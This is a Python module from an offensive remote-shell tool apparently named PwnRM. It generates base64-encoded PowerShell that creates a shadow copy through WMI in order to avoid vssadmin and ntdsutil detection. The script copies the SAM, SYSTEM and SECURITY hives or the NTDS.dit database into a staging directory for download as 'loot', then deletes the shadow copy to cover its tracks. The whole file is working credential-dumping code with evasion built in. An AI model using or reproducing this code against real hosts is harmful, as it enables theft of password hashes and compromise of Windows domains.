"""Volume Shadow Copy Service extraction through WMI.

The module avoids ``vssadmin.exe`` and ``ntdsutil.exe``, but the selected
database and hives are intentionally copied to a temporary staging directory
on the remote host so that the operator can download them.
"""

import re
from typing import List, Any
from . import BaseModule
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class VSSModule(BaseModule):
    name = "vss"
    description = "WMI VSS shadow-copy extractor (remote temporary staging for SAM/SYSTEM/NTDS.dit)"
    author = "uziii2208"
    options = {
        "--drive": {"desc": "Target drive letter (default: C:)"},
        "sam": {"desc": "Extract SAM and SYSTEM hives to temporary staging path"},
        "ntds": {"desc": "Extract active NTDS.dit and SYSTEM hive (Domain Controllers)"},
        "--clean": {"desc": "Compatibility flag; created shadow copies are always deleted"},
    }

    def run(self, shell, args: List[str]) -> Any:
        drive = "C:"
        requested_modes = []
        index = 0
        while index < len(args):
            arg = args[index].lower()
            if arg == "--drive":
                if index + 1 >= len(args) or args[index + 1].startswith("-"):
                    shell.write_error("  [-] --drive requires a drive letter such as C:.")
                    return {"status": "error", "reason": "missing_drive"}
                drive = args[index + 1].rstrip("\\").upper()
                if not drive.endswith(":"):
                    drive += ":"
                index += 2
                continue
            if arg in {"sam", "--sam", "ntds", "--ntds"}:
                requested_modes.append(arg.lstrip("-"))
                index += 1
                continue
            if arg == "--clean":
                index += 1
                continue
            shell.write_error(f"  [-] Unknown VSS option: {args[index]}")
            return {"status": "error", "reason": "invalid_options"}

        if not re.fullmatch(r"[A-Z]:", drive):
            shell.write_error("  [-] Invalid VSS drive. Expected a drive letter such as C:.")
            return {"status": "error", "reason": "invalid_drive"}

        request_ntds = "ntds" in requested_modes
        request_sam = "sam" in requested_modes
        if request_ntds and request_sam:
            shell.write_error("  [-] Choose either SAM or NTDS extraction, not both.")
            return {"status": "error", "reason": "conflicting_modes"}

        requested_mode = "ntds" if request_ntds else "sam" if request_sam else "auto"
        drive_ps = shell._pse(drive)
        requested_mode_ps = shell._pse(requested_mode)

        shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow-copy staging on {drive}..."))

        ps = f"""
$ErrorActionPreference = 'Stop'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM WMI VSS Extraction & Credential Hives" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

$drive = '{drive_ps}\\'
$requestedMode = '{requested_mode_ps}'
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
$targetHive = switch ($requestedMode) {{
    "ntds" {{ "NTDS.dit" }}
    "sam"  {{ "SAM" }}
    default {{ if ($isDC) {{ "NTDS.dit" }} else {{ "SAM" }} }}
}}

Write-Host "  [*] Target Volume : $drive" -ForegroundColor White
Write-Host "  [*] Target Mode   : $targetHive extraction" -ForegroundColor Gray

# 1. Create Volume Shadow Copy via WMI (No vssadmin.exe / ntdsutil.exe alerts)
Write-Host "`n[1. Creating Ephemeral Shadow Copy via WMI Win32_ShadowCopy]" -ForegroundColor Yellow
$shadowClass = [wmiclass]"Win32_ShadowCopy"
$createResult = $shadowClass.Create($drive, "ClientAccessible")

if ($createResult.ReturnValue -ne 0) {{
    throw "Failed to create Volume Shadow Copy (ReturnValue=$($createResult.ReturnValue)); Administrator rights and VSS are required"
}}

$shadowId = $createResult.ShadowID
Write-Host "  [+] Shadow Copy Created successfully! ID: $shadowId" -ForegroundColor Green

$shadow = $null
$stagingDir = $null
try {{
    # 2. Retrieve Shadow Copy Device Object Path
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowId }}
    $deviceObj = $shadow.DeviceObject
    if (-not $deviceObj) {{ throw "Could not resolve the Shadow Copy DeviceObject" }}
    Write-Host "  [+] Device Object : $deviceObj" -ForegroundColor Green

    # 3. Extract Target Hives
    Write-Host "`n[2. Extracting Registry & Database Hives]" -ForegroundColor Yellow
    $tempPath = [System.IO.Path]::GetTempPath()
    $stagingDir = Join-Path $tempPath ("pwnrm_vss_" + [Guid]::NewGuid().ToString("N"))
    New-Item -Path $stagingDir -ItemType Directory | Out-Null

    # Copy SYSTEM hive
    $sysSrc = "$deviceObj\\Windows\\System32\\config\\SYSTEM"
    $sysDst = Join-Path $stagingDir "SYSTEM"
    [System.IO.File]::Copy($sysSrc, $sysDst, $true)
    $sysSize = (Get-Item $sysDst).Length
    $sysHash = (Get-FileHash -LiteralPath $sysDst -Algorithm SHA256).Hash
    Write-Host "  [+] SYSTEM Hive Extracted : $sysDst ($sysSize bytes)" -ForegroundColor Green
    Write-Host "      SHA-256: $sysHash" -ForegroundColor Gray

    if ($targetHive -eq "NTDS.dit") {{
        $ntdsSrc = "$deviceObj\\Windows\\NTDS\\ntds.dit"
        $ntdsDst = Join-Path $stagingDir "ntds.dit"
        if ([System.IO.File]::Exists($ntdsSrc)) {{
            [System.IO.File]::Copy($ntdsSrc, $ntdsDst, $true)
            $ntdsSize = (Get-Item $ntdsDst).Length
            $ntdsHash = (Get-FileHash -LiteralPath $ntdsDst -Algorithm SHA256).Hash
            Write-Host "  [!] NTDS.DIT Extracted   : $ntdsDst ($ntdsSize bytes)" -ForegroundColor Red
            Write-Host "      SHA-256: $ntdsHash" -ForegroundColor DarkRed
        }} else {{
            throw "ntds.dit was not found on $drive"
        }}
    }} else {{
        $samSrc = "$deviceObj\\Windows\\System32\\config\\SAM"
        $samDst = Join-Path $stagingDir "SAM"
        if ([System.IO.File]::Exists($samSrc)) {{
            [System.IO.File]::Copy($samSrc, $samDst, $true)
            $samSize = (Get-Item $samDst).Length
            $samHash = (Get-FileHash -LiteralPath $samDst -Algorithm SHA256).Hash
            Write-Host "  [+] SAM Hive Extracted    : $samDst ($samSize bytes)" -ForegroundColor Green
            Write-Host "      SHA-256: $samHash" -ForegroundColor Gray
        }} else {{ throw "SAM hive was not found on $drive" }}

        $secSrc = "$deviceObj\\Windows\\System32\\config\\SECURITY"
        $secDst = Join-Path $stagingDir "SECURITY"
        if ([System.IO.File]::Exists($secSrc)) {{
            [System.IO.File]::Copy($secSrc, $secDst, $true)
            Write-Host "  [+] SECURITY Hive Extracted : $secDst" -ForegroundColor Green
        }}
    }}
}} catch {{
    Write-Host "  [-] Error during file extraction: $_" -ForegroundColor Red
    throw
}} finally {{
    # 4. Immediate Forensics Cleanup: Delete Shadow Copy
    Write-Host "`n[3. Deleting Ephemeral Shadow Copy (Forensic Hygiene)]" -ForegroundColor Yellow
    $cleanupShadow = $shadow
    if (-not $cleanupShadow) {{
        $cleanupShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
    }}
    if ($cleanupShadow) {{ $null = $cleanupShadow.Delete() }}
    $remainingShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
    if ($remainingShadow) {{ throw "Shadow Copy $shadowId still exists after cleanup" }}
    Write-Host "  [+] Shadow Copy $shadowId deleted." -ForegroundColor Green
}}

Write-Host "`n  [*] Staged artifacts ready for download at: $stagingDir" -ForegroundColor Cyan
Write-Host "  [*] Use '!download $stagingDir' to pull artifacts into local loot store." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        shell.run_with_interrupt(cmd, shell.write_line)
        return {"status": "completed"}
